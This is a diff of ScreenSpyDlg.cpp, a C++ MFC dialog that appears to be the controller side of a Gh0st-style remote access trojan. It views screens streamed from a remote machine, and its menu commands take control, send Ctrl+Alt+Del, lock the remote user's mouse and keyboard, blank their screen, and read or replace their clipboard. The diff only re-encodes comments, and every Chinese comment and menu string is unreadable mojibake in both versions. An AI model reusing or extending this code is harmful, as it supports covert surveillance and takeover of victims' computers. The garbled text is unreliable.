@@ -1,4 +1,4 @@
-ï»¿// ScreenSpyDlg.cpp : implementation file
+// ScreenSpyDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -18,21 +18,21 @@ static char THIS_FILE[] = __FILE__;
 
 enum
 {
-	IDM_CONTROL = 0x0010,	// æ§åˆ¶å±å¹•
-	IDM_TOPMOST,			// å±å¹•çª—å£ç½®é¡¶
-	IDM_CTRL_ALT_DEL,		// å‘é€Ctrl+Alt+Del
-	IDM_TRACE_CURSOR,		// è·Ÿè¸ªæ˜¾ç¤ºè¿œç¨‹é¼ æ ‡
-	IDM_BLOCK_INPUT,		// é”å®šè¿œç¨‹è®¡ç®—æœºè¾“å…¥
-	IDM_BLANK_SCREEN,		// é»‘å±
-	IDM_CAPTURE_LAYER,		// æ•æ‰å±‚
-	IDM_SAVEDIB,			// ä¿å­˜å›¾ç‰‡
-	IDM_GET_CLIPBOARD,		// è·å–å‰ªè´´æ¿
-	IDM_SET_CLIPBOARD,		// è®¾ç½®å‰ªè´´æ¿
-	IDM_AERO_DISABLE,		// ç¦ç”¨æ¡Œé¢åˆæˆ(Aero)
-	IDM_AERO_ENABLE,		// å¯ç”¨æ¡Œé¢åˆæˆ(Aero)
-	IDM_ALGORITHM_HOME,		// å®¶ç”¨åŠå…¬ç®—æ³•
-	IDM_ALGORITHM_XVID,		// å½±è§†å¨±ä¹ç®—æ³•
-// 	IDM_DEEP_1,				// å±å¹•è‰²å½©æ·±åº¦.....
+	IDM_CONTROL = 0x0010,	// ¿ØÖÆÆÁÄ»
+	IDM_TOPMOST,			// ÆÁÄ»´°¿ÚÖÃ¶¥
+	IDM_CTRL_ALT_DEL,		// ·¢ËÍCtrl+Alt+Del
+	IDM_TRACE_CURSOR,		// ¸ú×ÙÏÔÊ¾Ô¶³ÌÊó±ê
+	IDM_BLOCK_INPUT,		// Ëø¶¨Ô¶³Ì¼ÆËã»úÊäÈë
+	IDM_BLANK_SCREEN,		// ºÚÆÁ
+	IDM_CAPTURE_LAYER,		// ²¶×½²ã
+	IDM_SAVEDIB,			// ±£´æÍ¼Æ¬
+	IDM_GET_CLIPBOARD,		// »ñÈ¡¼ôÌù°å
+	IDM_SET_CLIPBOARD,		// ÉèÖÃ¼ôÌù°å
+	IDM_AERO_DISABLE,		// ½ûÓÃ×ÀÃæºÏ³É(Aero)
+	IDM_AERO_ENABLE,		// ÆôÓÃ×ÀÃæºÏ³É(Aero)
+	IDM_ALGORITHM_HOME,		// ¼ÒÓÃ°ì¹«Ëã·¨
+	IDM_ALGORITHM_XVID,		// Ó°ÊÓÓéÀÖËã·¨
+// 	IDM_DEEP_1,				// ÆÁÄ»É«²ÊÉî¶È.....
 // 	IDM_DEEP_4_GRAY,
 // 	IDM_DEEP_4_COLOR,
 // 	IDM_DEEP_8_GRAY,
@@ -41,9 +41,9 @@ enum
 	IDM_DEEP_32
 };
 
-// ä¸¤ç§ç®—æ³•
-#define ALGORITHM_HOME	1	// å®¶ç”¨åŠå…¬ç®—æ³•
-#define ALGORITHM_XVID	2	// å½±è§†å¨±ä¹ç®—æ³•
+// Á½ÖÖËã·¨
+#define ALGORITHM_HOME	1	// ¼ÒÓÃ°ì¹«Ëã·¨
+#define ALGORITHM_XVID	2	// Ó°ÊÓÓéÀÖËã·¨
 
 #ifndef SPI_GETWINARRANGING
 #define SPI_GETWINARRANGING 0x0082
@@ -74,13 +74,13 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientCont
 	
 	m_iocpServer	= pIOCPServer;
 	m_pContext		= pContext;
-	m_bIsFirst		= true; // å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ‰“å¼€å¯¹è¯æ¡†ï¼Œæ˜¾ç¤ºæç¤ºç­‰å¾…ä¿¡æ¯
+	m_bIsFirst		= true; // Èç¹ûÊÇµÚÒ»´Î´ò¿ª¶Ô»°¿ò£¬ÏÔÊ¾ÌáÊ¾µÈ´ıĞÅÏ¢
 	m_lpvLastBits	= NULL;
 	
 	char szIconFileName[MAX_PATH];
 	pGetSystemDirectoryA(szIconFileName, MAX_PATH);
 	lstrcat(szIconFileName, _T("\\shell32.dll"));
-	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szIconFileName, 17/*ç½‘ä¸Šé‚»å±…å›¾æ ‡ç´¢å¼•*/);
+	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szIconFileName, 17/*ÍøÉÏÁÚ¾ÓÍ¼±êË÷Òı*/);
 	
 	sockaddr_in  sockAddr;
 	memset(&sockAddr, 0, sizeof(sockAddr));
@@ -97,7 +97,7 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientCont
 	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBitmapInfoSize);
 	memset(&m_rcRestore, 0, sizeof(m_rcRestore));
 	
-	m_bIsCtrl = false;    // é»˜è®¤ä¸è¿›è¡Œæ§åˆ¶
+	m_bIsCtrl = false;    // Ä¬ÈÏ²»½øĞĞ¿ØÖÆ
 	m_nFramesPerSecond = 0;
 	m_nFramesCount = 0;
 	m_LastCursorIndex = 1;
@@ -173,7 +173,7 @@ void CScreenSpyDlg::OnReceiveComplete()
 		DrawFirstScreen();
 		break;
 	case TOKEN_NEXTSCREEN:
-		// è®¡ç®—å¸§ç‡(FPS)
+		// ¼ÆËãÖ¡ÂÊ(FPS)
 		++m_nFramesCount;
 		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_HOME)
 			DrawNextScreenHome();
@@ -187,7 +187,7 @@ void CScreenSpyDlg::OnReceiveComplete()
 		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
 		break;
 	default:
-		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
+		// ´«Êä·¢ÉúÒì³£Êı¾İ
 		return;
 	}
 }
@@ -195,7 +195,7 @@ void CScreenSpyDlg::OnReceiveComplete()
 bool CScreenSpyDlg::SaveSnapshot()
 {
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
-	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("ä½å›¾æ–‡ä»¶(*.bmp)|*.bmp|"), this);
+	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("Î»Í¼ÎÄ¼ş(*.bmp)|*.bmp|"), this);
 	if(dlg.DoModal () != IDOK)
 		return false;
 	
@@ -204,11 +204,11 @@ bool CScreenSpyDlg::SaveSnapshot()
 	CFile	file;
 	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
-		MessageBox("æ–‡ä»¶ä¿å­˜å¤±è´¥");
+		MessageBox("ÎÄ¼ş±£´æÊ§°Ü");
 		return false;
 	}
 	
-	// BITMAPINFOå¤§å°
+	// BITMAPINFO´óĞ¡
 	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
 	
 	// Fill in the fields of the file header
@@ -286,31 +286,31 @@ BOOL CScreenSpyDlg::OnInitDialog()
 	if (pSysMenu != NULL)
 	{
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "æ§åˆ¶å±å¹•(&C)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, "å±å¹•çª—å£ç½®é¡¶(&T)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_CTRL_ALT_DEL, "å‘é€Ctrl+Alt+Del(&K)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡(&F)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜(&O)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "æœåŠ¡ç«¯é»‘å±(&B)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "æ•æ‰å±‚(å¯¼è‡´é¼ æ ‡é—ªçƒ)(&L)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "ä¿å­˜å¿«ç…§(&S)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "¿ØÖÆÆÁÄ»(&C)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, "ÆÁÄ»´°¿ÚÖÃ¶¥(&T)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_CTRL_ALT_DEL, "·¢ËÍCtrl+Alt+Del(&K)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "¸ú×Ù·şÎñ¶ËÊó±ê(&F)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ(&O)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "·şÎñ¶ËºÚÆÁ(&B)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "²¶×½²ã(µ¼ÖÂÊó±êÉÁË¸)(&L)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "±£´æ¿ìÕÕ(&S)");
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "è·å–å‰ªè´´æ¿(&G)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "è®¾ç½®å‰ªè´´æ¿(&P)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "»ñÈ¡¼ôÌù°å(&G)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "ÉèÖÃ¼ôÌù°å(&P)");
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_DISABLE, "ç¦ç”¨æ¡Œé¢åˆæˆ(&D)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_ENABLE, "å¯ç”¨æ¡Œé¢åˆæˆ(&E)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_DISABLE, "½ûÓÃ×ÀÃæºÏ³É(&D)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_ENABLE, "ÆôÓÃ×ÀÃæºÏ³É(&E)");
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_HOME, "å®¶ç”¨åŠå…¬ç®—æ³•(&H)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_XVID, "å½±è§†å¨±ä¹ç®—æ³•(&X)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_HOME, "¼ÒÓÃ°ì¹«Ëã·¨(&H)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_XVID, "Ó°ÊÓÓéÀÖËã·¨(&X)");
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1,       "1 ä½é»‘ç™½(&A)");
-// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY,  "4 ä½ç°åº¦(&B)");
-// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 ä½å½©è‰²(&C)");
-// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY,  "8 ä½ç°åº¦(&D)");
-// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 ä½å½©è‰²(&E)");
-		pSysMenu->AppendMenu(MF_STRING|MF_GRAYED, IDM_DEEP_16, "16ä½å¢å¼ºé¢œè‰²(&U)");
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32ä½çœŸå½©é¢œè‰²(&R)");
+// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1,       "1 Î»ºÚ°×(&A)");
+// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY,  "4 Î»»Ò¶È(&B)");
+// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 Î»²ÊÉ«(&C)");
+// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY,  "8 Î»»Ò¶È(&D)");
+// 		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 Î»²ÊÉ«(&E)");
+		pSysMenu->AppendMenu(MF_STRING|MF_GRAYED, IDM_DEEP_16, "16Î»ÔöÇ¿ÑÕÉ«(&U)");
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32Î»Õæ²ÊÑÕÉ«(&R)");
 		
 		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_HOME, MF_BYCOMMAND);
 		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
@@ -328,7 +328,7 @@ BOOL CScreenSpyDlg::OnInitDialog()
 	m_LastCursorPos.y = 0;
 	m_bIsTraceCursor = false;
 	
-	// åˆå§‹åŒ–çª—å£å¤§å°ç»“æ„
+	// ³õÊ¼»¯´°¿Ú´óĞ¡½á¹¹
 	m_hCurrWndDC	= ::GetDC(m_hWnd);
 	m_hLastMemDC	= ::CreateCompatibleDC(m_hCurrWndDC);
 	m_hLastBitmap	= ::CreateDIBSection(m_hCurrWndDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
@@ -344,7 +344,7 @@ void CScreenSpyDlg::FullScreen()
 {	
 	LONG style = ::GetWindowLong(this->m_hWnd, GWL_STYLE);
 	
-	if(!m_bIsFullScreen) //å…¨å±æ˜¾ç¤º
+	if(!m_bIsFullScreen) //È«ÆÁÏÔÊ¾
 	{
 		APPBARDATA abd;
 		memset(&abd, 0, sizeof(abd));
@@ -352,22 +352,22 @@ void CScreenSpyDlg::FullScreen()
 		int nMaxWindowWidth, nMaxWindowHeight;
 		UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
 		SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
-		if (abd.uEdge == 0) // ä»»åŠ¡æ åœ¨å·¦
+		if (abd.uEdge == 0) // ÈÎÎñÀ¸ÔÚ×ó
 		{
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
 		}
-		if (abd.uEdge == 1) // ä»»åŠ¡æ åœ¨ä¸Š
+		if (abd.uEdge == 1) // ÈÎÎñÀ¸ÔÚÉÏ
 		{
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
 		}
-		if (abd.uEdge == 2) // ä»»åŠ¡æ åœ¨å³
+		if (abd.uEdge == 2) // ÈÎÎñÀ¸ÔÚÓÒ
 		{
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
 		}
-		if (abd.uEdge == 3) // ä»»åŠ¡æ åœ¨ä¸‹
+		if (abd.uEdge == 3) // ÈÎÎñÀ¸ÔÚÏÂ
 		{
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom - abd.rc.top);
@@ -378,8 +378,8 @@ void CScreenSpyDlg::FullScreen()
 		GetClientRect(&rectClient);
 		ClientToScreen(&rectClient);
 		
-		int	nBorderSize = rectClient.left - rectWindow.left; // å•è¾¹æ¡†çš„å¤§å°(å®½åº¦æˆ–é«˜åº¦)
-		int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // æ ‡é¢˜æ çš„é«˜åº¦
+		int	nBorderSize = rectClient.left - rectWindow.left; // µ¥±ß¿òµÄ´óĞ¡(¿í¶È»ò¸ß¶È)
+		int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // ±êÌâÀ¸µÄ¸ß¶È
 		int nMaxClientWidth = nMaxWindowWidth - nBorderSize * 2;
 		int nMaxClientHeight = nMaxWindowHeight - nTitleHeight - nBorderSize * 2;
 		
@@ -416,10 +416,10 @@ void CScreenSpyDlg::FullScreen()
 			MoveWindow(0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
 		}
 		
-		m_bIsFullScreen = true;  // è®¾ç½®å…¨å±æ˜¾ç¤ºæ ‡å¿—
+		m_bIsFullScreen = true;  // ÉèÖÃÈ«ÆÁÏÔÊ¾±êÖ¾
 		SendMessage(WM_ACTIVATE, MAKEWPARAM(WA_ACTIVE, FALSE), NULL);
 	}
-	else // çª—å£æ˜¾ç¤º
+	else // ´°¿ÚÏÔÊ¾
 	{
 		style |= WS_DLGFRAME | WS_THICKFRAME;
 		SetWindowLong(this->m_hWnd, GWL_STYLE, style);
@@ -429,7 +429,7 @@ void CScreenSpyDlg::FullScreen()
 		{
 			SendMessage(WM_ACTIVATE, MAKEWPARAM(WA_INACTIVE, FALSE), NULL);
 		}
-		m_bIsFullScreen = false; // å–æ¶ˆå…¨å±æ˜¾ç¤ºæ ‡å¿—
+		m_bIsFullScreen = false; // È¡ÏûÈ«ÆÁÏÔÊ¾±êÖ¾
 	}
 }
 
@@ -460,7 +460,7 @@ void CScreenSpyDlg::ResetScreen()
 		m_XvidDec.Close();
 		m_XvidDec.Open(m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_lpbmi_full->bmiHeader.biBitCount);
 		
-		// åˆ†è¾¨ç‡å‘ç”Ÿæ”¹å˜
+		// ·Ö±æÂÊ·¢Éú¸Ä±ä
  		if (nOldWidth != m_lpbmi_full->bmiHeader.biWidth || nOldHeight != m_lpbmi_full->bmiHeader.biHeight)
  		{
 			if (m_bIsFullScreen)
@@ -516,14 +516,14 @@ void CScreenSpyDlg::DrawFirstScreen()
 
 void CScreenSpyDlg::DrawNextScreenHome()
 {
-	// æ ¹æ®é¼ æ ‡æ˜¯å¦ç§»åŠ¨å’Œå±å¹•æ˜¯å¦å˜åŒ–åˆ¤æ–­æ˜¯å¦é‡ç»˜é¼ æ ‡, é˜²æ­¢é¼ æ ‡é—ªçƒ
+	// ¸ù¾İÊó±êÊÇ·ñÒÆ¶¯ºÍÆÁÄ»ÊÇ·ñ±ä»¯ÅĞ¶ÏÊÇ·ñÖØ»æÊó±ê, ·ÀÖ¹Êó±êÉÁË¸
 	bool	bIsReDraw = false;
-	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // æ ‡è¯†[1] + ç®—æ³•[1] + å…‰æ ‡ä½ç½®[8] + å…‰æ ‡ç±»å‹ç´¢å¼•[1]
+	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ±êÊ¶[1] + Ëã·¨[1] + ¹â±êÎ»ÖÃ[8] + ¹â±êÀàĞÍË÷Òı[1]
 	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
 	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
 	DWORD	dwNextOffset = 0;
 	
-	// åˆ¤æ–­é¼ æ ‡æ˜¯å¦ç§»åŠ¨
+	// ÅĞ¶ÏÊó±êÊÇ·ñÒÆ¶¯
 	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(2);
 	if (memcmp(lpNextCursorPos, &m_LastCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
 	{
@@ -531,7 +531,7 @@ void CScreenSpyDlg::DrawNextScreenHome()
 		memcpy(&m_LastCursorPos, lpNextCursorPos, sizeof(POINT));
 	}
 	
-	// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
+	// ¹â±êÀàĞÍ·¢Éú±ä»¯
 	LPBYTE lpNextCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10);
 	if (*lpNextCursorIndex != m_LastCursorIndex)
 	{
@@ -545,7 +545,7 @@ void CScreenSpyDlg::DrawNextScreenHome()
 		}
 	}
 	
-	// å±å¹•æ•°æ®æ˜¯å¦å˜åŒ–
+	// ÆÁÄ»Êı¾İÊÇ·ñ±ä»¯
 	while (dwNextOffset < dwNextLength)
 	{
 		int *pinlen = (int *)((LPBYTE)lpNextScreen + dwNextOffset);
@@ -586,19 +586,19 @@ bool CScreenSpyDlg::JPG_BMP(int cbit, void *input, int inlen, void *output)
 	struct jpeg_decompress_struct jds;
 	struct jpeg_error_mgr jem;
 	
-	// è®¾ç½®é”™è¯¯å¤„ç†
+	// ÉèÖÃ´íÎó´¦Àí
 	jds.err = jpeg_std_error(&jem);
-	// åˆ›å»ºè§£å‹ç»“æ„
+	// ´´½¨½âÑ¹½á¹¹
 	jpeg_create_decompress(&jds);
-	// è®¾ç½®è¯»å–(è¾“å…¥)ä½ç½®
+	// ÉèÖÃ¶ÁÈ¡(ÊäÈë)Î»ÖÃ
 	jpeg_mem_src(&jds, (byte *)input, inlen);
-	// è¯»å–å¤´éƒ¨ä¿¡æ¯
+	// ¶ÁÈ¡Í·²¿ĞÅÏ¢
 	if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK)
 	{
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// è®¾ç½®ç›¸å…³å‚æ•°
+	// ÉèÖÃÏà¹Ø²ÎÊı
 	switch (cbit)
 	{
 	case 16:
@@ -614,7 +614,7 @@ bool CScreenSpyDlg::JPG_BMP(int cbit, void *input, int inlen, void *output)
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// å¼€å§‹è§£å‹å›¾åƒ
+	// ¿ªÊ¼½âÑ¹Í¼Ïñ
 	if (!jpeg_start_decompress(&jds))
 	{
 		jpeg_destroy_decompress(&jds);
@@ -626,13 +626,13 @@ bool CScreenSpyDlg::JPG_BMP(int cbit, void *input, int inlen, void *output)
 		byte* pline = (byte*)output + jds.output_scanline * line_stride;
 		jpeg_read_scanlines(&jds, &pline, 1);
 	}
-	// å®Œæˆå›¾åƒè§£å‹
+	// Íê³ÉÍ¼Ïñ½âÑ¹
 	if (!jpeg_finish_decompress(&jds))
 	{
 		jpeg_destroy_decompress(&jds);
 		return false;
 	}
-	// é‡Šæ”¾ç›¸å…³èµ„æº
+	// ÊÍ·ÅÏà¹Ø×ÊÔ´
 	jpeg_destroy_decompress(&jds);
 	
 	return true;
@@ -640,14 +640,14 @@ bool CScreenSpyDlg::JPG_BMP(int cbit, void *input, int inlen, void *output)
 
 void CScreenSpyDlg::DrawNextScreenXvid()
 {
-	// æ ¹æ®é¼ æ ‡æ˜¯å¦ç§»åŠ¨å’Œå±å¹•æ˜¯å¦å˜åŒ–åˆ¤æ–­æ˜¯å¦é‡ç»˜é¼ æ ‡, é˜²æ­¢é¼ æ ‡é—ªçƒ
+	// ¸ù¾İÊó±êÊÇ·ñÒÆ¶¯ºÍÆÁÄ»ÊÇ·ñ±ä»¯ÅĞ¶ÏÊÇ·ñÖØ»æÊó±ê, ·ÀÖ¹Êó±êÉÁË¸
 	bool	bIsReDraw = false;
-	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // æ ‡è¯†[1] + ç®—æ³•[1] + å…‰æ ‡ä½ç½®[8] + å…‰æ ‡ç±»å‹ç´¢å¼•[1]
+	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ±êÊ¶[1] + Ëã·¨[1] + ¹â±êÎ»ÖÃ[8] + ¹â±êÀàĞÍË÷Òı[1]
 	LPVOID	lpLastScreen = m_lpvLastBits;
 	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
 	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
 	
-	// åˆ¤æ–­é¼ æ ‡æ˜¯å¦ç§»åŠ¨
+	// ÅĞ¶ÏÊó±êÊÇ·ñÒÆ¶¯
 	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(2);
 	if (memcmp(lpNextCursorPos, &m_LastCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
 	{
@@ -655,7 +655,7 @@ void CScreenSpyDlg::DrawNextScreenXvid()
 		memcpy(&m_LastCursorPos, lpNextCursorPos, sizeof(POINT));
 	}
 	
-	// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
+	// ¹â±êÀàĞÍ·¢Éú±ä»¯
 	LPBYTE lpNextCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10);
 	if (*lpNextCursorIndex != m_LastCursorIndex)
 	{
@@ -669,7 +669,7 @@ void CScreenSpyDlg::DrawNextScreenXvid()
 		}
 	}
 	
-	// å±å¹•æ•°æ®æ˜¯å¦å˜åŒ–
+	// ÆÁÄ»Êı¾İÊÇ·ñ±ä»¯
 	if (dwNextLength > 0)
 	{
 		bIsReDraw = true;
@@ -768,7 +768,7 @@ void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
 	GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbih);
 	sbiv.dxyLineButton = sbiv.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbiv.dxyLineButton;
 	sbih.dxyLineButton = sbih.rgstate[0] & STATE_SYSTEM_INVISIBLE ? 0 : sbih.dxyLineButton;
-	// æ ¹æ®å®¢æˆ·åŒºå¤§å°, è°ƒæ•´æ°´å¹³æ»šåŠ¨æ¡å’Œå‚ç›´æ»šåŠ¨æ¡çš„çŠ¶æ€
+	// ¸ù¾İ¿Í»§Çø´óĞ¡, µ÷ÕûË®Æ½¹ö¶¯ÌõºÍ´¹Ö±¹ö¶¯ÌõµÄ×´Ì¬
 // 	if (cx >= m_lpbmi_full->bmiHeader.biWidth)
 // 		ShowScrollBar(SB_HORZ, FALSE);
 // 	else
@@ -786,12 +786,12 @@ void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
 // 		si.nMax = m_lpbmi_full->bmiHeader.biHeight - cy - (sbit.rgstate[0] & STATE_SYSTEM_INVISIBLE ? sbih.dxyLineButton : 0);
 // 		SetScrollInfo(SB_VERT, &si, TRUE);
 // 	}
-	// å®¢æˆ·åŒºå®½åº¦+å‚ç›´æ»šåŠ¨æ¡å®½åº¦>=åˆ†è¾¨ç‡å®½åº¦ && å®¢æˆ·åŒºé«˜åº¦+æ°´å¹³æ»šåŠ¨æ¡é«˜åº¦>=åˆ†è¾¨ç‡é«˜åº¦
+	// ¿Í»§Çø¿í¶È+´¹Ö±¹ö¶¯Ìõ¿í¶È>=·Ö±æÂÊ¿í¶È && ¿Í»§Çø¸ß¶È+Ë®Æ½¹ö¶¯Ìõ¸ß¶È>=·Ö±æÂÊ¸ß¶È
 	if (cx + sbiv.dxyLineButton >= m_lpbmi_full->bmiHeader.biWidth && cy + sbih.dxyLineButton >= m_lpbmi_full->bmiHeader.biHeight)
 	{
 		ShowScrollBar(SB_BOTH, FALSE);
 	}
-	// æ°´å¹³æ»šåŠ¨æ¡ä¸å¯è§æ—¶, çª—å£å®½åº¦å¢åŠ ä¸€ä¸ªå‚ç›´æ»šåŠ¨æ¡çš„å®½åº¦
+	// Ë®Æ½¹ö¶¯Ìõ²»¿É¼ûÊ±, ´°¿Ú¿í¶ÈÔö¼ÓÒ»¸ö´¹Ö±¹ö¶¯ÌõµÄ¿í¶È
 	if (sbih.rgstate[0] & STATE_SYSTEM_INVISIBLE && !m_rcRestore.right && !m_rcRestore.bottom)
 	{
 		RECT rectWindow;
@@ -799,7 +799,7 @@ void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
 		rectWindow.right += sbiv.dxyLineButton;
 		MoveWindow(&rectWindow);
 	}
-	// å‚ç›´æ»šåŠ¨æ¡ä¸å¯è§æ—¶, çª—å£é«˜åº¦å¢åŠ ä¸€ä¸ªæ°´å¹³æ»šåŠ¨æ¡çš„é«˜åº¦
+	// ´¹Ö±¹ö¶¯Ìõ²»¿É¼ûÊ±, ´°¿Ú¸ß¶ÈÔö¼ÓÒ»¸öË®Æ½¹ö¶¯ÌõµÄ¸ß¶È
 	if (sbiv.rgstate[0] & STATE_SYSTEM_INVISIBLE && !m_rcRestore.right && !m_rcRestore.bottom)
 	{
 		RECT rectWindow;
@@ -823,7 +823,7 @@ void CScreenSpyDlg::OnNcLButtonDblClk(UINT nHitTest, CPoint point)
 		{
 			MoveWindow(&m_rcRestore);
 			memset(&m_rcRestore, 0, sizeof(m_rcRestore));
-			// å¿…é¡»OnSizeä¸€æ¬¡, å¦åˆ™æ»šåŠ¨æ¡æ˜¾ç¤ºæœ‰ç‚¹é—®é¢˜
+			// ±ØĞëOnSizeÒ»´Î, ·ñÔò¹ö¶¯ÌõÏÔÊ¾ÓĞµãÎÊÌâ
 			GetClientRect(&rectClient);
